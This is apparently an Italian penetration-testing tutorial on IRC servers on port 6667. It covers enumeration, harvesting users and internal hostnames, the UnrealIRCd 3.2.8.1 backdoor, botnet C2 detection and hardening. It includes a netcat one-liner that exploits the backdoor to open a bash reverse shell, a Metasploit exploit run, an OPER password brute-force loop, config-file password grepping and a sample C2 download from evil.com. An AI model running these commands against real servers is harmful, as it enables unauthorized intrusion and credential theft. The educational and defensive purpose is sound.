---
title: 'Porta 6667 IRC: UnrealIRCd, C2 e Information Gathering'
slug: porta-6667-irc
description: >-
  Porta 6667 IRC nel pentest: enumerazione server e canali, info leak su utenti
  e hostname, botnet C2, UnrealIRCd e rischi di hijacking.
image: /porta-6667-irc.webp
draft: false
date: 2026-04-15T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - IRC
  - UnrealIRCd
  - Botnet C2
---

IRC (Internet Relay Chat) è uno dei protocolli di comunicazione più vecchi ancora in uso, nato nel 1988. Ascolta sulla porta 6667 TCP (non cifrata) e 6697 TCP (con TLS). Se lo associ mentalmente alle chat room degli anni '90, non sbagli — ma nel penetration testing IRC è tutt'altro che nostalgico. I server IRC esposti in un'infrastruttura aziendale sono quasi sempre un segnale d'allarme: o è un servizio legacy dimenticato con vulnerabilità note, o — scenario peggiore — è un **canale di comando e controllo (C2)** di una botnet o di un malware che usa IRC per ricevere istruzioni. Trojan come Unrealircd hanno avuto backdoor inserite direttamente nel codice sorgente, e i software IRC server più comuni (InspIRCd, UnrealIRCd, ngircd) hanno una storia lunga di CVE con Remote Code Execution pre-auth.

Anche quando non è un C2, un server IRC esposto è una fonte di information gathering notevole: hostname interni nei messaggi WHOIS, indirizzi IP reali degli utenti, nomi utente, canali con conversazioni sensibili e, nei casi migliori, credenziali scambiate in chiaro.

## Come Funziona IRC

```
Client IRC                         Server IRC (:6667)
┌──────────────┐                   ┌──────────────────────┐
│ HexChat      │                   │ UnrealIRCd / InspIRCd│
│ irssi        │── TCP 6667 ────►│                       │
│ weechat      │                   │ #generale   (canale) │
│              │ ◄── messaggi ──  │ #dev-ops    (canale)  │
│              │                   │ #support    (canale)  │
│ Bot/Malware  │── comandi C2 ──►│ #botnet-cmd (nascosto)│
└──────────────┘                   └──────────────────────┘
```

IRC funziona su canali (stanze) prefissati da `#`. Gli utenti si connettono, joinano i canali e scambiano messaggi in tempo reale. I messaggi passano in chiaro sulla porta 6667 — tutto è intercettabile.

| Porta     | Protocollo      | Note                      |
| --------- | --------------- | ------------------------- |
| **6667**  | IRC (plaintext) | Standard, tutto in chiaro |
| 6697      | IRC over TLS    | Versione cifrata          |
| 6660-6669 | IRC range       | Porte alternative comuni  |
| 7000      | IRC alternativa | Usata da alcune reti      |
| 8067      | IRC web gateway | Accesso via browser       |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 6667,6697,6660-6669 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd 3.2.8.1
6697/tcp open  irc     UnrealIRCd (SSL)
```

La versione è fondamentale: `UnrealIRCd 3.2.8.1` ha una backdoor nota (CVE-2010-2075).

### Script Nmap

```bash
nmap -p 6667 --script=irc-info,irc-botnet-channels,irc-unrealircd-backdoor 10.10.10.40
```

```
| irc-info:
|   server: irc.corp.internal
|   version: Unreal3.2.8.1
|   servers: 1
|   ops: 2
|   chans: 5
|   users: 23
|   lservers: 0
|   lusers: 23
|   uptime: 45 days, 12:30:00
|   source host: 10.10.10.200
|_  source ident: ~attacker
| irc-unrealircd-backdoor:
|   VULNERABLE:
|   UnrealIRCd Backdoor Command Execution
|     State: VULNERABLE
|_    IDs: CVE:CVE-2010-2075
```

**Intelligence ricchissima:** nome del server interno (`irc.corp.internal`), versione esatta, 23 utenti connessi, 5 canali, **backdoor confermata**.

### Connessione manuale

```bash
# Con netcat (il modo più grezzo ma funziona sempre)
nc 10.10.10.40 6667
```

```
:irc.corp.internal NOTICE * :*** Looking up your hostname...
:irc.corp.internal NOTICE * :*** Found your hostname (attacker.example.com)
```

```bash
# Registrati con un nick
NICK recon_user
USER recon 0 * :Recon User
```

```
:irc.corp.internal 001 recon_user :Welcome to the Corp IRC Network recon_user!recon@10.10.10.200
:irc.corp.internal 002 recon_user :Your host is irc.corp.internal, running version Unreal3.2.8.1
:irc.corp.internal 003 recon_user :This server was created Mon Jan 01 2026
:irc.corp.internal 004 recon_user :irc.corp.internal Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp
```

### Con un client IRC

```bash
# irssi (terminale)
irssi -c 10.10.10.40 -p 6667 -n recon_user

# Dentro irssi:
/connect 10.10.10.40 6667
```

## 2. Information Gathering

### Lista canali

```
LIST
```

```
:irc.corp.internal 322 recon_user #generale 15 :Canale generale
:irc.corp.internal 322 recon_user #dev-ops 8 :DevOps team
:irc.corp.internal 322 recon_user #incident 3 :Security incidents
:irc.corp.internal 322 recon_user #deploy 5 :Deploy notifications
:irc.corp.internal 322 recon_user #secret 2 :
```

Cinque canali. `#incident` (conversazioni di sicurezza interna) e `#secret` (senza descrizione, sospetto) sono i più interessanti.

### Entra nei canali e osserva

```
JOIN #dev-ops
JOIN #incident
JOIN #secret
```

Siediti e ascolta. Le conversazioni possono contenere:

* Credenziali condivise tra colleghi ("la password del DB di staging è...")
* Hostname e IP interni
* Procedure di deploy con dettagli tecnici
* Discussioni su vulnerabilità trovate internamente
* Link a documenti interni, wiki, sistemi di ticketing

### WHOIS sugli utenti

```
WHOIS admin
```

```
:irc.corp.internal 311 recon_user admin admin admin-workstation.corp.internal * :System Administrator
:irc.corp.internal 312 recon_user admin irc.corp.internal :Corp IRC Server
:irc.corp.internal 319 recon_user admin :#generale @#dev-ops @#incident @#secret
:irc.corp.internal 317 recon_user admin 300 1704067200 :seconds idle, signon time
```

**Intelligence dal WHOIS:**

* `admin-workstation.corp.internal` → hostname della macchina dell'admin
* `@#dev-ops @#incident @#secret` → è operatore (`@`) su tre canali
* L'utente si chiama `admin` ed è il System Administrator

```bash
# WHOIS su tutti gli utenti visibili
WHO *
```

```
:irc.corp.internal 352 recon_user * admin admin-ws.corp.internal irc.corp.internal admin H@ :System Administrator
:irc.corp.internal 352 recon_user * j.rossi dev-pc-04.corp.internal irc.corp.internal j_rossi H :Junior Developer
:irc.corp.internal 352 recon_user * deploy ci-runner-01.corp.internal irc.corp.internal deploy_bot G :Deploy Bot
```

Tre utenti con hostname interni → mappa della rete. `deploy_bot` connesso da `ci-runner-01` → probabile server Jenkins/GitLab CI.

### NAMES (utenti in un canale)

```
NAMES #dev-ops
```

```
:irc.corp.internal 353 recon_user = #dev-ops :@admin j_rossi m_bianchi deploy_bot
```

## 3. CVE e RCE

### CVE-2010-2075 — UnrealIRCd Backdoor (il più famoso)

La versione 3.2.8.1 di UnrealIRCd distribuita tra novembre 2009 e giugno 2010 conteneva una **backdoor inserita nel codice sorgente**: qualsiasi riga che inizia con `AB;` viene eseguita come comando di sistema.

```bash
# Exploit manuale con netcat
echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'" | nc 10.10.10.40 6667
```

```bash
# Con Metasploit
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.40
set LHOST 10.10.10.200
run
```

```
[*] Started reverse TCP handler on 10.10.10.200:4444
[*] 10.10.10.40:6667 - Connected to 10.10.10.40:6667...
[*] 10.10.10.40:6667 - Sending backdoor command...
[*] Command shell session 1 opened

id
uid=1001(irc) gid=1001(irc) groups=1001(irc)
```

RCE in un singolo pacchetto. La macchina classica "Irked" di HackTheBox usa esattamente questo exploit.

### CVE-2020-7496 — InspIRCd

Remote crash / DoS in versioni specifiche di InspIRCd.

### Altre CVE IRC server

```bash
searchsploit unrealircd
searchsploit inspircd
searchsploit ngircd
searchsploit charybdis irc
```

## 4. IRC come Canale C2 di Botnet

Se trovi un server IRC in un'infrastruttura dove non dovrebbe esserci, è un segnale forte di compromissione. I malware usano IRC per il C2 perché:

* Protocollo semplice e leggero
* Facile da implementare in un bot
* I canali IRC funzionano come gruppi di comando
* Il traffico sulla 6667 può sembrare legittimo

### Identificare un C2 IRC

```bash
# Cerca canali con nomi sospetti
LIST
```

Nomi come `#cmd`, `#botnet`, `#control`, `#xbot`, canali con un solo operatore e molti utenti silenziosi → probabile C2.

```bash
# Osserva il traffico del canale
JOIN #sospetto
# Se vedi messaggi come:
# !scan 10.0.0.0/8
# !ddos target.com 80
# !download http://evil.com/payload.exe
# → è un C2
```

### Reporting

Un IRC C2 trovato durante un pentest è un finding critico: significa che la rete è **già compromessa** da qualcun altro. Va escalato immediatamente al cliente.

## 5. Operator Privilege Escalation

### Brute force OPER password

Su molti server IRC, il comando `OPER` dà privilegi di operatore del server (non solo del canale). La password è nel file di configurazione:

```
OPER admin password_here
```

```bash
# Brute force manuale
for pass in admin password irc oper changeme; do
    echo -e "NICK test\nUSER test 0 * :test\nOPER admin $pass\nQUIT" | nc 10.10.10.40 6667
done
```

Con privilegi OPER puoi: killare utenti, vedere IP di tutti, creare/distruggere canali, modificare la configurazione del server, e in alcuni casi eseguire comandi sul sistema.

### Channel takeover

```
# Se un canale non ha operatori online
JOIN #target_channel
# Automaticamente diventi operatore se il canale è vuoto
```

## 6. Sniffing del Traffico IRC

IRC sulla 6667 trasmette in chiaro. Se sei in posizione di MITM:

```bash
# Cattura traffico IRC
tcpdump -i eth0 -A port 6667 | grep -iE "PRIVMSG|PASS|OPER|password|secret"
```

```
PRIVMSG #dev-ops :ragazzi la password del nuovo DB è DbStaging2025!
PRIVMSG j_rossi :ti mando la chiave SSH in privato
PRIVMSG j_rossi :-----BEGIN RSA PRIVATE KEY-----
```

Messaggi privati e di canale, tutto intercettabile — incluse credenziali scambiate tra utenti.

## 7. Post-Exploitation

### Da shell IRC a root

La shell da UnrealIRCd backdoor gira come utente `irc`. Escalazione standard:

```bash
# Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Enumera
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/cron* 2>/dev/null
```

```bash
# File di configurazione IRC (contengono password)
find / -name "unrealircd.conf" -o -name "inspircd.conf" -o -name "ircd.conf" 2>/dev/null
cat /etc/unrealircd/unrealircd.conf | grep -iE "password|pass|oper"
```

La configurazione IRC contiene password OPER, link password (per collegare server IRC tra loro) e a volte credenziali di servizi esterni.

Per l'escalation completa: [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc).

## 8. Detection & Hardening

* **Rimuovi i server IRC** se non sono necessari — nel 2026 Slack, Teams e Mattermost li hanno sostituiti
* **Se necessario, usa solo TLS** (porta 6697) — mai plaintext
* **Password OPER robusta** e non di default
* **Limita l'accesso** — firewall sulla 6667, solo dalla rete interna
* **Monitora** traffico sulla 6667 — se nessuno usa IRC ufficialmente, qualsiasi connessione è sospetta
* **Aggiorna** il software IRC — le versioni vecchie hanno backdoor e RCE
* **Non distribuire hostname interni** nei messaggi WHOIS: configura hostname cloaking

## 9. Cheat Sheet Finale

| Azione         | Comando                                                                  |
| -------------- | ------------------------------------------------------------------------ |
| Nmap           | `nmap -sV -p 6667,6697 --script=irc-info,irc-unrealircd-backdoor target` |
| Connessione nc | `nc target 6667` poi `NICK test` / `USER test 0 * :test`                 |
| Client         | `irssi -c target -p 6667 -n nick`                                        |
| Lista canali   | `LIST`                                                                   |
| Join canale    | `JOIN #canale`                                                           |
| WHOIS utente   | `WHOIS username`                                                         |
| Lista utenti   | `WHO *`                                                                  |
| UnrealIRCd RCE | `echo "AB; command" \| nc target 6667`                                   |
| Metasploit     | `use exploit/unix/irc/unreal_ircd_3281_backdoor`                         |
| OPER login     | `OPER username password`                                                 |
| Searchsploit   | `searchsploit unrealircd inspircd ngircd`                                |
| Sniff traffico | `tcpdump -i eth0 -A port 6667`                                           |

***

Riferimento: RFC 1459 (IRC Protocol), CVE-2010-2075, HackTricks IRC, OSCP methodology. Uso esclusivo in ambienti autorizzati. [https://hackviser.com/tactics/pentesting/services/irc](https://hackviser.com/tactics/pentesting/services/irc)

> La community è il cuore di HackIta. [Supporta il progetto](https://hackita.it/dona) per mantenere le guide gratuite e indipendenti, o porta le tue skill al livello successivo con la [formazione 1:1](https://hackita.it/formazione).
